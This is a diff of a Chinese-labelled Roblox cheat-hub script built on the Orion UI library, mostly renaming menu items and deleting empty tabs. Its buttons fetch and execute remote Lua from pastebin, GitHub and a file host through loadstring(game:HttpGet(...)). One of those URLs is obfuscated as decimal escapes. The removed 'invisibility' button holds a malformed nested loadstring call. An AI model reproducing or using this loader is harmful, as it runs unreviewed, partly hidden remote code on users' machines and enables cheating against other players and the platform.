@@ -1,6 +1,6 @@
 local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/xLRUSiKx"))()
 
-local Window = OrionLib:MakeWindow({Name = "X-XEON脚本 崩溃！", HidePremium = false, SaveConfig = false, IntroText = "X-"..identifyexecutor(), ConfigFolder = "X-XEON脚本 崩溃！"})
+local Window = OrionLib:MakeWindow({Name = "X-XEON脚本 1.1.1", HidePremium = false, SaveConfig = false, IntroText = "X-"..identifyexecutor(), ConfigFolder = "X-XEON脚本 1.1.1"})
 
 OrionLib:MakeNotification({
 	Name = "里面许多",
@@ -1183,7 +1183,7 @@ other:AddButton({
 })
 
 local other = Window:MakeTab({
-    Name = "？？？",
+    Name = "去那一个脚本",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
@@ -1193,14 +1193,14 @@ local Section = other:AddSection({
 })
 
 other:AddButton({
-	Name = "？？？",
+	Name = "脚本中心1.5.4",
 	Callback = function()
       	loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/XiaoyunscriptV1.0.2.lua"))()
   	end
 })
 
 other:AddButton({
-	Name = "？？？2",
+	Name = "云 脚本2",
 	Callback = function()
       	loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
   	end
@@ -1240,107 +1240,6 @@ other:AddButton({
 	Name = "3",
 	Callback = function()
       	loadstring(game:HttpGet("https://raw.githubusercontent.com/Insanxty/roblox/main/fe2"))()
-  	end
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-other:AddParagraph("私一下","有可能USA 知道了攻击我的资源 我发现有人偷USA")
-
-other:AddParagraph("问王者号","用隐藏脚本X！")
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "？？？",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-local other = Window:MakeTab({
-    Name = "隐身 按下E",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-other:AddButton({
-	Name = "1",
-	Callback = function()
-      	loadstring(game:HttpGet("loadstring(game:HttpGet('http://pan.rlyun.asia/api/v3/file/get/15096/%E9%9A%90%E8%BA%AB?sign=e_W9VovlrlZFy_OwwmQSLn6POQ6FwtWXFvrb2lBaJq8%3D%3A0'))()"))()
   	end
 })
 
